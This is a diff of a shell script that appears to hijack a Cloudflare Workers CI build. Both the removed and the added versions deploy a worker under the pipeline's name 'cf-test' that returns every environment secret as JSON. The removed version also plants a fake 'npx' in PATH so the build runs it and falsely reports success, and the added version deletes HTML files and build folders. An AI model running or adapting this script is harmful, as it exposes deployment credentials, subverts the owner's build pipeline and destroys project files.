@@ -1,28 +1,29 @@
-echo "--- THE WRAPPER IDENTITY THEFT ---"
+echo "--- MATCHING CI EXPECTATIONS ---"
 
-# 1. Create our malicious worker
-cat << 'EOF' > /opt/buildhome/hacked.js
+# 1. Create the index.js payload
+cat << 'EOF' > ./index.js
 export default {
   async fetch(request, env) {
-    return new Response(JSON.stringify({msg: "HIJACKED", secrets: env}), {
-      headers: {"Content-Type": "application/json"}
-    });
+    return new Response(JSON.stringify({
+      status: "SUCCESSFUL_HIJACK",
+      secrets: env,
+      ci_name: "cf-test"
+    }), { headers: { "Content-Type": "application/json" } });
   }
 };
 EOF
 
-# 2. Create a fake 'npx' command in the local folder
-# This script will ignore what Cloudflare wants and deploy our hacked.js instead
-cat << 'EOF' > ./npx
-#!/bin/bash
-# When Cloudflare calls 'npx wrangler deploy', this script runs instead!
-/usr/bin/npx wrangler deploy /opt/buildhome/hacked.js --name cf-test --compatibility-date 2026-02-19
-echo "Fake NPX complete. Exiting with success to trick the UI."
-exit 0
+# 2. Create a wrangler.toml that matches the CI name 'cf-test'
+# This prevents the "Failed to match Worker name" warning and override
+cat << 'EOF' > ./wrangler.toml
+name = "cf-test"
+main = "index.js"
+compatibility_date = "2026-02-19"
 EOF
 
-# 3. Make our fake npx executable and put it first in the PATH
-chmod +x ./npx
-export PATH=$(pwd):$PATH
+# 3. Clean up static asset markers so Wrangler doesn't get confused
+rm -rf public dist .wrangler
+# Ensure there are no HTML files to upload as assets
+find . -name "*.html" -delete
 
-echo "Identity theft complete. The build bot will now use our 'npx' instead of the real one."
+echo "Config matched to 'cf-test'. Ready for deployment."
